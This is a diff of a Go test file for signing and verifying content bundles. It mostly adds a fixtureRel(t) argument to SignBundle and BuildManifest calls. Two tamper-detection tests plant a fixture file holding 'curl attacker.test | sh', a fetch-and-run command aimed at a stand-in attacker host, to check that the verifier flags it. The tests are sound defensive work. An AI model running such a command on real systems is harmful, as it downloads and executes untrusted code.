@@ -88,7 +88,7 @@ func write(t *testing.T, fsys afero.Fs, rel, body string) {
 func TestSignBundle_ThenVerifyBundle_IsVerified(t *testing.T) {
 	store, b, _ := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
 	require.NoError(t, err)
@@ -116,7 +116,7 @@ func TestVerifyBundle_SignedByAnUntrustedKeyIsUnattestedNotTampered(t *testing.T
 	store, b, _ := fixture(t)
 	signer, _ := testSigner(t)
 	_, otherPub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
 	require.NoError(t, err)
@@ -132,7 +132,7 @@ func TestVerifyBundle_UntrustedSignerIsNamedForComparisonNotTrusted(t *testing.T
 	store, b, _ := fixture(t)
 	signer, pub := testSigner(t)
 	_, otherPub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
 	require.NoError(t, err)
@@ -162,7 +162,7 @@ func TestVerifyBundle_UnsignedNamesNoKey(t *testing.T) {
 func TestVerifyBundle_VerifiedCarriesNoDisplayFingerprint(t *testing.T) {
 	store, b, _ := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
 	require.NoError(t, err)
@@ -174,7 +174,7 @@ func TestVerifyBundle_VerifiedCarriesNoDisplayFingerprint(t *testing.T) {
 func TestVerifyBundle_ApproveOnlyKeyCannotSatisfyThePublishSlot(t *testing.T) {
 	store, b, _ := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	approveOnly := rootTrusting(allowedsigners.Entry{
 		Principals: []string{"reviewer"}, Namespaces: []string{signing.NamespaceApprove}, PublicKey: pub,
@@ -216,7 +216,7 @@ func TestVerifyItem_ApproveNamespaceSignatureIsNotAPublishAttestation(t *testing
 func TestVerifyBundle_ExtraDirectoryInASignedTreeIsCaught(t *testing.T) {
 	store, b, fsys := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")
 
@@ -237,7 +237,7 @@ func TestSignBundle_RefusesATreeWithAnUnrecognisedFileInAKindDirectory(t *testin
 	signer, _ := testSigner(t)
 	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")
 
-	err := SignBundle(ctx, store, b, signer)
+	err := SignBundle(ctx, store, b, fixtureRel(t), signer)
 	require.Error(t, err)
 	assert.ErrorIs(t, err, content.ErrUnclaimed)
 }
@@ -254,7 +254,7 @@ func TestVerifyBundle_ACoveredButUnrecognisedFileStillRefusesTheBundle(t *testin
 	// Build and sign the manifest directly, bypassing SignBundle's refusal, to
 	// stand in for a tree ctxloom did not produce.
 	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")
-	m, err := content.BuildManifest(ctx, b)
+	m, err := content.BuildManifest(ctx, b, fixtureRel(t))
 	require.NoError(t, err)
 	require.NoError(t, store.PutManifest(ctx, b.ID(), m))
 	_, covered := m.Lookup("hooks/pre_tool/typo.yml")
@@ -273,7 +273,7 @@ func TestVerifyBundle_ACoveredButUnrecognisedFileStillRefusesTheBundle(t *testin
 func TestVerifyBundle_EditedFileUnderASignedManifestIsTampered(t *testing.T) {
 	store, b, fsys := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	write(t, fsys, solidFS, "---\ntags: []\n---\nsubstituted body\n")
 
@@ -293,10 +293,10 @@ func TestVerifyBundle_EditedFileUnderASignedManifestIsTampered(t *testing.T) {
 func TestVerifyBundle_RewritingTheManifestIsTamperedNotUnsigned(t *testing.T) {
 	store, b, fsys := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")
-	m, err := content.BuildManifest(ctx, b)
+	m, err := content.BuildManifest(ctx, b, fixtureRel(t))
 	require.NoError(t, err)
 	require.NoError(t, store.PutManifest(ctx, b.ID(), m))
 
@@ -317,7 +317,7 @@ func TestVerifyItem_MixedProvenanceWhenTheManifestAgrees(t *testing.T) {
 	item, err := b.Item(ctx, solid)
 	require.NoError(t, err)
 	require.NoError(t, SignItem(ctx, store, item, signing.FormRaw, coSigner))
-	require.NoError(t, SignBundle(ctx, store, b, pubSigner))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), pubSigner))
 
 	root := rootTrusting(publisher("pub@example.test", pubKey), publisher("co@example.test", coKey))
 	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, root, now)
@@ -342,7 +342,7 @@ func TestVerifyItem_SubstitutedContentUnderACoTrustedKeyIsItsOwnVerdict(t *testi
 	pubSigner, pubKey := testSigner(t)
 	attackerSigner, attackerKey := testSigner(t)
 
-	require.NoError(t, SignBundle(ctx, store, b, pubSigner))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), pubSigner))
 
 	// The attacker rewrites one file and signs the NEW bytes with their own
 	// co-trusted key. The manifest is untouched and still verifies.
@@ -416,7 +416,7 @@ func TestVerifyItem_SigningRawDoesNotAttestDistilled(t *testing.T) {
 func TestVerifyBundle_CorruptSignatureBlobIsTampered(t *testing.T) {
 	store, b, fsys := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	sigs, err := b.BundleSignatures(ctx)
 	require.NoError(t, err)
@@ -437,8 +437,8 @@ func TestVerifyBundle_CorruptSignatureBlobIsTampered(t *testing.T) {
 func TestSignBundle_IsIdempotentForOneKey(t *testing.T) {
 	store, b, _ := fixture(t)
 	signer, pub := testSigner(t)
-	require.NoError(t, SignBundle(ctx, store, b, signer))
-	require.NoError(t, SignBundle(ctx, store, b, signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
+	require.NoError(t, SignBundle(ctx, store, b, fixtureRel(t), signer))
 
 	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
 	require.NoError(t, err)
